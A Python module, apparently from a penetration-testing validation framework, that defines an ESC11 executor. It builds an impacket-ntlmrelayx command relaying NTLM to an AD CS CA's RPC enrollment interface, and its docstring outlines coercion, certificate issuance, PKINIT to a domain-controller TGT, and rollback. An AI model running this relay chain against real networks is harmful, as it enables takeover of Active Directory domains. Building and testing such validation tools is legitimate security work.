"""ESC11 validation executor -- FULL (N1), the RPC-transport ADCS relay front.

ESC11 shares ESC8's shape (the :class:`_ADCSRelayFrontExecutor` listener chassis:
start ntlmrelayx --adcs -> coerce -> poll for the issued cert -> PKINIT ->
destroy key material), differing only in the relay TRANSPORT: instead of the
HTTP Web-Enrollment endpoint it relays to the CA's RPC enrollment interface
(MS-ICPR) when request encryption is NOT enforced:

    start  impacket-ntlmrelayx -t rpc://<ca_host> -rpc-mode ICPR
               -icpr-ca-name <ca> --adcs -smb2support

Everything else -- the coercion trigger, the issued-PFX poll, the PKINIT step,
the mutating VERIFIED rollback (destroy the issued .pfx/.ccache), the
``cert_issued_and_used`` terminal, the ``{host_id}`` scoring identity, the
``pre={S0_USER_CREDS}`` / ``eff={DC_TGT}`` capability-state metadata, and the H3
composed-rollback deferral -- is inherited unchanged from ESC8's base.

``verified_recipe=False`` (recipe-known, not lab-proven). ESC11 adds one param,
``ca`` (the issuing CA name, required by ``-icpr-ca-name``). UNVERIFIED: the
``-rpc-mode ICPR -icpr-ca-name`` invocation and the ESC11 markers (pin in-lab).
"""
from __future__ import annotations

from typing import Any

from ..recommend import ParamSpec
from .base import ExecutorContext
from .esc8 import _ADCSRelayFrontExecutor


class ESC11Executor(_ADCSRelayFrontExecutor):
    technique = "ESC11"
    recipe_ref = ("N1 ESC11 = ntlmrelayx -t rpc://<ca_host> -rpc-mode ICPR "
                  "-icpr-ca-name <ca> --adcs ; coerce <victim_dc> ; PKINIT with the "
                  "issued pfx ; ROLLBACK destroy key material "
                  "(recipe-known, NOT lab-proven)")

    def _extra_param_specs(self, ctx: ExecutorContext, finding) -> list[ParamSpec]:
        entity = finding.entity or {}
        return [
            ParamSpec(
                name="ca", kind="free",
                description="The issuing Certificate Authority name (ntlmrelayx "
                            "-icpr-ca-name, required for the RPC/ICPR relay).",
                recommended=entity.get("ca"),
                rationale="The AD CS CA aranum promoted; override to target a "
                          "specific CA (#66142 override model).",
            ),
        ]

    def _listener_argv(self, cfg, v: dict[str, Any]) -> list[str]:
        ca_host = v["ca_host"]
        ca = v.get("ca") or ""
        return ["impacket-ntlmrelayx", "-t", f"rpc://{ca_host}",
                "-rpc-mode", "ICPR", "-icpr-ca-name", ca, "--adcs", "-smb2support"]
